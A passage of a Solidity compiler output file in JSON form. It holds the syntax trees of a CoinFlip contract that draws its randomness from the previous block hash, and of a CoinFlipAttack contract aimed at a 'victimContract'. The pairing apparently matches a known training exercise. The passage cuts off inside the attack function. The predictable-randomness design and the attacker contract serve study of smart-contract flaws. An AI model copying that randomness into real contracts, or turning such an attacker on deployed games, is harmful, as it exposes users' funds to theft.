					"metadata": "{\"compiler\":{\"version\":\"0.8.27+commit.40a35a09\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_victimContract\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"flipAttack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"victimContract\",\"outputs\":[{\"internalType\":\"contract CoinFlip\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CoinFlipAttack.sol\":\"CoinFlipAttack\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CoinFlip.sol\":{\"keccak256\":\"0xde2267fe6019add64a388ed10e52a67078d341d4eb1d5be53eb539348d383940\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://1875ab2048c56bdc04b4bb14a8a7d8a8c95e51a1094b14db0122ba27d43d79f7\",\"dweb:/ipfs/Qmeoh9v1P16swMmbaaHgvW5LwthEv23tJdxxHZLV8bxtyd\"]},\"contracts/CoinFlipAttack.sol\":{\"keccak256\":\"0xf76259b09fe5111426914ab6f739850c2a0ac89a3adb4d1f9dff82c3859968e4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://88430f57232b988ff8be2d9630559fff68a153eb302827298926faadf52b9ba8\",\"dweb:/ipfs/QmaFce48CQABm7e2N4yZMppMym8yq5fYGM55kBaz4XmDGw\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 87,
								"contract": "contracts/CoinFlipAttack.sol:CoinFlipAttack",
								"label": "victimContract",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(CoinFlip)81"
							},
							{
								"astId": 90,
								"contract": "contracts/CoinFlipAttack.sol:CoinFlipAttack",
								"label": "FACTOR",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_contract(CoinFlip)81": {
								"encoding": "inplace",
								"label": "contract CoinFlip",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contracts/CoinFlip.sol": {
				"ast": {
					"absolutePath": "contracts/CoinFlip.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						]
					},
					"id": 82,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "CoinFlip",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "CoinFlip",
							"nameLocation": "67:8:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 3,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nameLocation": "97:15:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "82:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 2,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "82:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 5,
									"mutability": "mutable",
									"name": "lastHash",
									"nameLocation": "126:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "118:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "118:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 8,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "148:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "140:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "140:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 7,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "157:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "255:36:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "265:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "283:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "265:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "265:19:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "252:2:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "255:0:0"
									},
									"scope": 81,
									"src": "241:50:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 79,
										"nodeType": "Block",
										"src": "346:448:0",
										"statements": [
											{
												"assignments": [
													24
												],
												"declarations": [
													{
														"constant": false,
														"id": 24,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "364:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "356:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 23,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "356:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 34,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 31,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 28,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "395:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 29,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberLocation": "401:6:0",
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "395:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "410:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "395:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 27,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "385:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 32,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "385:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 26,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "377:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 25,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "377:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 33,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "377:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "356:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 35,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "428:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 36,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "440:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "428:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 42,
												"nodeType": "IfStatement",
												"src": "424:61:0",
												"trueBody": {
													"id": 41,
													"nodeType": "Block",
													"src": "452:33:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 38,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "466:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "466:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 40,
															"nodeType": "ExpressionStatement",
															"src": "466:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 45,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 43,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "495:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 44,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "506:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "495:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 46,
												"nodeType": "ExpressionStatement",
												"src": "495:21:0"
											},
											{
												"assignments": [
													48
												],
												"declarations": [
													{
														"constant": false,
														"id": 48,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "534:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "526:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 47,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "526:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "545:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 50,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "558:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "545:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "526:38:0"
											},
											{
												"assignments": [
													54
												],
												"declarations": [
													{
														"constant": false,
														"id": 54,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "579:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "574:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 53,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "574:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 61,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 55,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 48,
															"src": "586:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "598:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "586:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 59,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "609:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 60,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "586:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 58,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "602:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "574:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 62,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "629:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 63,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "637:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "629:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 77,
													"nodeType": "Block",
													"src": "718:70:0",
													"statements": [
														{
															"expression": {
																"id": 73,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "732:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 72,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "750:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "732:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 74,
															"nodeType": "ExpressionStatement",
															"src": "732:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "772:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 22,
															"id": 76,
															"nodeType": "Return",
															"src": "765:12:0"
														}
													]
												},
												"id": 78,
												"nodeType": "IfStatement",
												"src": "625:163:0",
												"trueBody": {
													"id": 70,
													"nodeType": "Block",
													"src": "645:67:0",
													"statements": [
														{
															"expression": {
																"id": 66,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "659:17:0",
																"subExpression": {
																	"id": 65,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "659:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 67,
															"nodeType": "ExpressionStatement",
															"src": "659:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 68,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "697:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 22,
															"id": 69,
															"nodeType": "Return",
															"src": "690:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 80,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nameLocation": "306:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_guess",
												"nameLocation": "316:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "311:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 17,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "311:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "310:13:0"
									},
									"returnParameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 21,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "340:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 20,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "340:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "339:6:0"
									},
									"scope": 81,
									"src": "297:497:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 82,
							"src": "58:738:0",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:765:0"
				},
				"id": 0
			},
			"contracts/CoinFlipAttack.sol": {
				"ast": {
					"absolutePath": "contracts/CoinFlipAttack.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						],
						"CoinFlipAttack": [
							140
						]
					},
					"id": 141,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 83,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:1"
						},
						{
							"absolutePath": "contracts/CoinFlip.sol",
							"file": "contracts/CoinFlip.sol",
							"id": 84,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 141,
							"sourceUnit": 82,
							"src": "57:32:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "CoinFlipAttack",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 140,
							"linearizedBaseContracts": [
								140
							],
							"name": "CoinFlipAttack",
							"nameLocation": "100:14:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "f32d251d",
									"id": 87,
									"mutability": "mutable",
									"name": "victimContract",
									"nameLocation": "138:14:1",
									"nodeType": "VariableDeclaration",
									"scope": 140,
									"src": "121:31:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_CoinFlip_$81",
										"typeString": "contract CoinFlip"
									},
									"typeName": {
										"id": 86,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 85,
											"name": "CoinFlip",
											"nameLocations": [
												"121:8:1"
											],
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 81,
											"src": "121:8:1"
										},
										"referencedDeclaration": 81,
										"src": "121:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlip_$81",
											"typeString": "contract CoinFlip"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 90,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "166:6:1",
									"nodeType": "VariableDeclaration",
									"scope": 140,
									"src": "158:94:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 88,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "158:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 89,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "175:77:1",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 101,
										"nodeType": "Block",
										"src": "296:59:1",
										"statements": [
											{
												"expression": {
													"id": 99,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 95,
														"name": "victimContract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 87,
														"src": "306:14:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 97,
																"name": "_victimContract",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 92,
																"src": "332:15:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 96,
															"name": "CoinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "323:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlip_$81_$",
																"typeString": "type(contract CoinFlip)"
															}
														},
														"id": 98,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "323:25:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														}
													},
													"src": "306:42:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$81",
														"typeString": "contract CoinFlip"
													}
												},
												"id": 100,
												"nodeType": "ExpressionStatement",
												"src": "306:42:1"
											}
										]
									},
									"id": 102,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 93,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 92,
												"mutability": "mutable",
												"name": "_victimContract",
												"nameLocation": "279:15:1",
												"nodeType": "VariableDeclaration",
												"scope": 102,
												"src": "271:23:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 91,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "271:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "270:25:1"
									},
									"returnParameters": {
										"id": 94,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "296:0:1"
									},
									"scope": 140,
									"src": "259:96:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 138,
										"nodeType": "Block",
										"src": "394:208:1",
										"statements": [
											{
												"assignments": [
													106
												],
												"declarations": [
													{
														"constant": false,
														"id": 106,
														"mutability": "mutable",
